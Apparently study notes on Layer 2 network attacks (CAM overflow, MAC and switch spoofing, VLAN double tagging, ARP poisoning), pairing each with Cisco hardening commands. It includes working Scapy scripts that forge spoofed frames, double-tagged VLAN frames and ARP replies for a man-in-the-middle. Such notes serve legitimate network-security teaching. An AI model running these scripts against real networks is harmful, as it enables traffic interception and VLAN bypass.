# Commands from book




Similar to a buffer overflow attack, the goal is to fill the switches table with "learned" MAC addresses and see what happens. The attacker sits on one port and generates a vast number of "spoofed" MAC entries. When the CAM table is full, all additional MACs will not be learned and will default to "open". This means that traffic without a CAM entry will be flooded out on all ports of the VLAN in question. Traffic with a CAM entry won’t be affected, but neighbor switches could be.

Depending on the switch in question, this type of attack can be mitigated.
```
switch(config)# interface fa0/10
switch(config-if)# switchport port security
switch(config-if)# switchport port security maximum 1
switch(config-if)# switchport port security violation shutdown
```






DEMO MAC Spoofing

Scapy Script to demonstrate MAC Spoofing
```
a=Ether()
a.dst="ff:ff:ff:ff:ff:ff"   #Specify any target MAC you require
a.src="01:02:03:aa:bb:cc"   #Insert your Spoofed MAC here
a.type=0x0800

b=IP()
b.proto=6               #specifies that TCP is encapsulated. Change to 1 for ICMP or 17 for UDP.
b.src="10.10.0.40"      #Any source IP
b.dst="172.16.82.106"   #Target IP

c=TCP()
c.sport=54321
c.dport=80

d="message"

sendp(a/b/c/d)
```

Switch Spoofing

In this attack, an attacking host imitates a trunking switch by crafting Dynamic Trunking Protocol (DTP) frames in order to form a trunk link with the switch. With a trunk link formed the attacker can then use tagging and trunking protocols such as ISL or 802.1q. Traffic for all VLANs is then accessible to the attacking host.
```
switch(config)# interface fastethernet 1/10
switch(config-if)# switchport mode access
switch(config-if)# switchport nonegotiate
switch(config-if)# switchport access vlan 10
switch(config)# iterface gigabit 0/1
switch(config-if)# switchport trunk encapsulation dot1q
switch(config-if)# switchport mode trunk
switch(config-if)# switchport nonegotiate
```


Double Tagging

This attack works if the attacker knows what the "native VLAN" that is used on your organization. Typically VLAN 1 is used. All VLANs will be "tagged" with its corresponding VLAN. The Native VLAN however is intended for local network communication and is not tagged. Thus anything tagged for the native VLAN will be stripped off. The attacker will insert 2 tags into their frames. The first tag will be for the Native VLAN and the second tag will be for whatever VLAN he is trying to access. Upon receipt the switch will then remove the Native VLAN tag and will leave the second VLAN tag in tact. This method also requires that the attacker and victim be separated by a trunk and a vulnerable switch.

```
switch(config)# vlan dot1q tag native
switch(config)# interface fastethernet 1/10
switch(config-if)# switchport mode access
switch(config-if)# switchport nonegotiate
switch(config-if)# switchport access vlan 10
switch(config)# iterface gigabit 0/1
switch(config-if)# switchport trunk encapsulation dot1q
switch(config-if)# switchport mode trunk
switch(config-if)# switchport nonegotiate
switch(config-if)# switchport trunk native vlan 999
```


DEMO VLAN Hopping

Scapy Script to demonstrate VLAN Hopping
```
a=Ether()
a.dst="ff:ff:ff:ff:ff:ff"
a.src="01:02:03:aa:bb:cc"
a.type=0x8100           #VLAN Tag will Follow

b=Dot1Q()
b.vlan=1                #Insert the network's Native VLAN number
b.type=0x8100           #Another VLAN Tag will Follow

c=Dot1Q()
c.vlan=20               #Target VLAN
c.type=0x0800           #IPv4 or any other Ethertype that is encapsulated

d=IP()
d.proto=6               #specifies that TCP is encapsulated. Change to 1 for ICMP or 17 for UDP.
d.src="10.10.0.40"      #Any source IP
d.dst="172.16.82.106"   #Target IP

e=TCP()
e.sport=54321
e.dport=80

f="message"

a.show()
b.show()
c.show()
d.show()
e.show()

sendp(a/b/c/d/e/f)
```

ARP Cache - is a collection of Layer 2 to Layer 3 address mappings discovered utilizing the ARP request/response process. When a host needs to send a packet both the L2 and L3 addresses are needed. The host will look in this table to determine if it already knows both the L2 and L3 addresses. If the target is not in the table then a ARP request is initiated. The ARP cache can be populated statically but mostly its done dynamically. This cache can be exploited by attackers with the aim to poison the cache with incorrect information to either perform a DoS or MitM.
```
arp -a
ip neighbor
```

Demonstrate man-in-the-middle (MitM) with ARP


DEMO ARP MitM attack
```
my_mac = ""             #Insert Your MAC address
victim1_mac = ""        #Insert victim1 MAC address
victim1_ip = ""         #Insert victim1 IP address
victim2_mac = ""        #Insert victim2 MAC address
victim2_ip = ""         #Insert victim2 IP addres

# -- ARP to Poison Victim 1 to pretend to be Victim 2 --
a = Ether()
a.src= my_mac
a.dst= victim1_mac
a.type= 0x0806

b = ARP()
b.op= 2
b.hwsrc= my_mac
b.psrc= victim2_ip    #Who you are pretending to be
b.hwdst= victim1_mac  #Who's ARP cache you are trying to poison
b.pdst= victim1_ip    #Who's ARP cache you are trying to poison

# -- ARP to Poison Victim 2 to pretend to be Victim 1 --
c = Ether()
c.src= my_mac
c.dst= victim2_mac
c.type= 0x0806

d = ARP()
d.op= 2
d.hwsrc= my_mac
d.psrc= victim1_ip    #Who you are pretending to be
d.hwdst= victim2_mac  #Who's ARP cache you are trying to poison
d.pdst= victim2_ip    #Who's ARP cache you are trying to poison

a.show()
b.show()
c.show()
d.show()

sendp(a/b); sendp(c/d)
```





















